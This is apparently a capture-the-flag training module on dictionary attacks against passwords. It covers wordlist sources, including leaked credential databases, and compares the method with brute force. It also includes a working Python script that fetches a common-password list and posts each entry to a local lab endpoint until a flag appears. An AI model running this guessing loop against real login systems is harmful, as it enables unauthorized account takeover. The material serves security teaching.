# Dictionary Attacks

## Overview

While comprehensive, brute-force attacks can be time-consuming and resource-intensive, especially against complex passwords. Dictionary attacks offer a more efficient alternative.

## The Power of Words

Dictionary attacks exploit the human tendency to use memorable passwords over secure ones. Many users choose passwords based on:
- Dictionary words
- Common phrases
- Names
- Easily guessable patterns

The success of a dictionary attack depends on wordlist quality and specificity. A well-crafted wordlist tailored to the target significantly increases breach probability.

## Brute Force vs. Dictionary Attack

| Feature | Dictionary Attack | Brute Force Attack | Explanation |
|---------|-------------------|-------------------|-------------|
| **Efficiency** | Faster, resource-efficient | Time-consuming, resource-intensive | Dictionary attacks reduce search space via pre-defined lists |
| **Targeting** | Highly adaptable | No targeting capability | Wordlists can incorporate target-specific information |
| **Effectiveness** | Excellent against weak passwords | Effective against all passwords (given time) | Discovers common passwords quickly; brute force is impractical for complex passwords |
| **Limitations** | Ineffective against random passwords | Impractical for lengthy/complex passwords | Random passwords won't appear in dictionaries; combinations are astronomical |

### Example Scenario

An attacker targeting a company portal might construct a wordlist including:
- Common weak passwords ("password123", "qwerty")
- Company name and variations
- Employee/department names
- Industry-specific jargon

## Building and Utilizing Wordlists

### Sources

- **Publicly Available**: SecLists, leaked credential databases
- **Custom-Built**: Information gathered during reconnaissance
- **Specialized**: Industry or company-specific lists
- **Pre-packaged**: Tools include wordlists like rockyou.txt

### Common Wordlists

| Wordlist | Description | Use |
|----------|-------------|-----|
| rockyou.txt | Millions of leaked passwords | General password brute force |
| top-usernames-shortlist.txt | Common usernames | Quick username attempts |
| xato-net-10-million-usernames.txt | 10 million usernames | Thorough username brute forcing |
| 2023-200_most_used_passwords.txt | 200 most common passwords (2023) | Target reused passwords |
| default-passwords.txt | Default credentials | Router/device defaults |

## Practical Implementation

### Setup

Start the target system, then create `dictionary-solver.py`:

```python
import requests

ip = "127.0.0.1"      # Change to your instance IP
port = 1234           # Change to your instance port

# Download common passwords
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password
for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Execution

```bash
python3 dictionary-solver.py
```

### Output Example

```
...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: tiger
Flag: HTB{...}
```

### How It Works

1. **Downloads wordlist** from SecLists
2. **Iterates through passwords**, sending POST requests to `/dictionary` endpoint
3. **Analyzes responses** for status code 200 and "flag" key
4. **Terminates** upon successful match or wordlist exhaustion
